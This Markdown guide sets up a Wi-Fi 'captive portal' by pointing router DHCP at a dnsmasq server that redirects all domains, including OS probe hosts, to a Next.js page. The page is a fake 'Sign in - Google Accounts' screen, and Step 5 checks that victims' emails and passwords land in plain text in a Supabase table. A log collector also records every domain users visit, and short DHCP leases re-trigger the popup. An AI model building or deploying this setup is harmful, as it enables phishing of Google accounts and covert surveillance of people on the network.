# DNS Captive Portal — Router Setup Guide

> **No router flashing required.** Works with any stock TP-Link, D-Link, Netgear, Asus, Huawei, or ISP modem/router.

---

## How it works

```
User connects to Wi-Fi
        ↓
Router's DHCP tells device: "Your DNS server is 192.168.1.X"
        ↓
User opens any website (e.g. google.com)
        ↓
DNS query goes to YOUR machine instead of the internet
        ↓
Your machine replies: "google.com = 192.168.1.X"  ← your portal IP
        ↓
Browser loads your Sign-In portal
        ↓
User signs in → credentials saved to Supabase → access granted
```

---

## What you need

| Item | Details |
|------|---------|
| A PC/server on the same network | Runs the Next.js app + dnsmasq |
| Your router admin panel | Usually `http://192.168.1.1` |
| Your machine's local IP | Run `ipconfig`, find `IPv4 Address` |

---

## Step 1 — Run your portal

### Locally on your network

```powershell
# In your project folder
npm run dev
```

Find your machine's local IP:

```powershell
ipconfig
# Look for: IPv4 Address . . . . : 192.168.1.X
```

Your portal is now at `http://192.168.1.X:3000`

> **Tip:** Set a static IP on your machine so it never changes.  
> Router admin → DHCP → **Static Leases / Address Reservation** → bind your MAC address to a fixed IP (e.g. `192.168.1.100`).

---

## Step 2 — Set up a local DNS server (dnsmasq)

This makes **every domain redirect to your portal**. Run it on the same machine as Next.js.

### Windows — via WSL (Windows Subsystem for Linux)

If you don't have WSL: open PowerShell as Administrator and run `wsl --install`, then reboot.

```bash
# Inside WSL terminal
sudo apt update && sudo apt install dnsmasq -y
```

Create the config:

```bash
sudo nano /etc/dnsmasq.conf
```

Paste this (replace `192.168.1.100` with your actual machine IP):

```ini
# Redirect ALL domains (including OS probe domains) to your portal machine
address=/#/192.168.1.100

# Explicitly ensure OS captive portal probe domains resolve to your server IP:
# Android:   connectivitycheck.gstatic.com
# iPhone:    captive.apple.com
# Windows:   www.msftconnecttest.com
address=/connectivitycheck.gstatic.com/192.168.1.100
address=/connectivitycheck.android.com/192.168.1.100
address=/captive.apple.com/192.168.1.100
address=/www.msftconnecttest.com/192.168.1.100

# Listen on all interfaces
listen-address=0.0.0.0
bind-interfaces

# Don't forward to upstream DNS (catch everything)
no-resolv

# BUT allow the portal's own upstream calls to reach the internet
server=/supabase.co/8.8.8.8
server=/vercel.app/8.8.8.8
server=/amazonaws.com/8.8.8.8

# Enable DNS activity logging
log-queries
log-facility=/var/log/dnsmasq.log

# Disable caching
cache-size=0
```

Start `dnsmasq`:

```bash
sudo systemctl stop systemd-resolved    # free up port 53
sudo systemctl start dnsmasq
sudo systemctl enable dnsmasq           # auto-start on boot
```

### Start Database Activity Log Collector Daemon

To automatically push visited domains from `/var/log/dnsmasq.log` into your Supabase PostgreSQL `user_activity_logs` table:

```bash
# Run log collector daemon in background
npx tsx scripts/log_collector.ts

# Or run with PM2 for 24/7 background execution:
sudo pm2 start "npx tsx scripts/log_collector.ts" --name "dns-activity-collector"
```

### OS Probe Hostnames & Automatic Captive Portal Popups

When devices join Wi-Fi, their OS automatically issues HTTP requests to specific probe URLs:
* **Android:** `http://connectivitycheck.gstatic.com/generate_204`
* **iPhone / iOS / macOS:** `http://captive.apple.com/hotspot-detect.html`
* **Windows:** `http://www.msftconnecttest.com/connecttest.txt`

Our Next.js middleware intercepts these plain HTTP probe requests and replies with a **HTTP 302 Redirect** pointing to `/wifi`. Because the probe expected a specific status code (e.g. `204 No Content` for Android or `Success` HTML for iOS) but received a `302 Redirect`, the operating system immediately detects a captive portal and automatically opens the native sign-in popup.

> 🔒 **HTTPS & Certificate Errors:**  
> HTTPS requests (e.g. opening `https://google.com`) before logging in will produce an expected browser certificate warning because SSL encryption prevents domain impersonation. Once the user signs in via the automatic portal popup, full normal browsing is restored.

### 💡 Optional: Re-triggering Popups aggressively if User Closes It

If a user closes or dismisses the captive portal popup without signing in, you can force the phone to automatically re-open the popup every 2 minutes by setting a **short DHCP Lease Time**:

* **If using your Router for DHCP:** In your router admin panel under **DHCP Settings**, set **Address Lease Time** to `2 minutes` (or `120 seconds`).
* **If using `dnsmasq` as your DHCP server:** Add `dhcp-range` to `/etc/dnsmasq.conf`:
  ```ini
  # Optional: Enable DHCP on dnsmasq with short 2-minute leases
  dhcp-range=192.168.1.100,192.168.1.200,2m
  ```

*How it works:* Every 2 minutes when the device renews its IP lease, the OS re-runs its HTTP probe checks (`gstatic.com` / `apple.com`). Since pre-login probes return `302 Redirect`, the OS automatically re-opens the popup window!

---

## Step 3 — Configure your router's DHCP DNS

This tells every Wi-Fi device to use YOUR machine as DNS server.

### TP-Link (Archer / TL series)

1. Open `http://192.168.0.1` → log in
2. Go to **Advanced** → **Network** → **DHCP Server**
3. Set:
   - **Primary DNS:** `192.168.1.100`
   - **Secondary DNS:** *(leave blank)*
4. Click **Save**

---

### D-Link

1. Open `http://192.168.0.1` → log in (default: admin / blank)
2. Go to **Setup** → **Network Settings**
3. Under **DHCP Server Settings**, set:
   - **Primary DNS Address:** `192.168.1.100`
4. Click **Save Settings**

---

### Netgear

1. Open `http://192.168.1.1` → log in
2. Go to **Advanced** → **Setup** → **LAN Setup**
3. Set **Domain Name Server (DNS) Address**:
   - **Primary DNS:** `192.168.1.100`
4. Click **Apply**

---

### Asus

1. Open `http://192.168.1.1` → log in
2. Go to **LAN** → **DHCP Server** tab
3. Set **DNS Server 1:** `192.168.1.100`
4. Click **Apply**

---

### Generic ISP modem (Algérie Télécom, Ooredoo, etc.)

1. Open `http://192.168.1.1` or `http://192.168.100.1`
2. Look for: **DHCP**, **LAN Settings**, or **DNS Configuration**
3. Set **Primary DNS** to your machine's IP
4. Save — reboot the router if prompted

---

## Step 4 — Test it

1. **Reconnect your phone** to the Wi-Fi (disconnect and reconnect to get a fresh DHCP lease)
2. Open a browser and go to **any HTTP site**:
   ```
   http://example.com
   http://neverssl.com
   ```
3. You should see your **Sign in - Google Accounts** portal

> ⚠️ **HTTPS sites (https://) will show a certificate warning** — this is expected and normal for DNS-based captive portals. Most mobile OS captive portal detectors use HTTP automatically, so Android/iOS will pop up the portal login screen on their own.

---

## Step 5 — Verify credentials are saving to Supabase

After a test sign-in:

1. Go to [supabase.com/dashboard](https://supabase.com/dashboard) → your project
2. **Table Editor** → `users` table
3. You should see a new row with the email and password that was entered ✅

---

## Troubleshooting

| Problem | Likely cause | Fix |
|---------|-------------|-----|
| Portal doesn't load at all | DNS not pointing to your machine | Run `nslookup google.com 192.168.1.100` — should return your IP |
| DNS works but shows error page | Next.js not running | Run `npm run dev` |
| Only works on some devices | Device has hardcoded DNS (e.g. 8.8.8.8) | On device: forget Wi-Fi and reconnect, or manually set DNS to `192.168.1.100` |
| HTTPS sites don't redirect | Expected — SSL prevents interception | Normal. Use `http://` test URLs |
| Phone shows no captive portal popup | OS detection varies | It still works — user just opens browser manually |
| Credentials not in Supabase | DB connection issue | Check dev server console for `[POST /api/auth/login]` errors |
| dnsmasq fails to start | Port 53 in use | Run `sudo systemctl stop systemd-resolved` first |

---

## Architecture

```
┌──────────────────────────────────────────────┐
│              Wi-Fi Router                     │
│  DHCP → hands out DNS = 192.168.1.100        │
└───────────────────┬──────────────────────────┘
                    │ all devices get your IP as DNS
         ┌──────────▼──────────────┐
         │  Your Machine           │
         │  IP: 192.168.1.100      │
         │                         │
         │  ┌───────────────────┐  │
         │  │ dnsmasq  (port 53)│  │  ← catches DNS queries
         │  │ *.* → 192.168.1.X │  │  ← returns your IP
         │  └───────────────────┘  │
         │  ┌───────────────────┐  │
         │  │ Next.js (port 3000)│  │  ← serves portal
         │  └───────────────────┘  │
         └─────────────────────────┘
                    │
                    ▼ HTTPS (IPv4, Session pooler)
             ┌─────────────┐
             │  Supabase   │  ← stores credentials
             └─────────────┘
```

---

## Run Next.js on port 80 (no `:3000` in the URL)

For a seamless experience with no port number visible:

```powershell
# Run as Administrator (port 80 requires elevated privileges on Windows)
npm run build
npx next start -p 80
```

Devices will then load the portal at `http://example.com` directly with no port visible.

---

## Production deployment (permanent install)

For a café, hotel, or office where this runs 24/7:

| Option | Cost | Notes |
|--------|------|-------|
| **Raspberry Pi 4** | ~$35 one-time | Runs Next.js + dnsmasq, draws <5W, fits behind the router |
| **Old laptop/mini PC** | Free if you have one | Same setup, just leave it on |
| **VPS + Vercel** | ~$5/month VPS for dnsmasq | Portal on Vercel, only dnsmasq runs on VPS |

For a Raspberry Pi, the exact same steps above apply — just run them in its terminal over SSH.


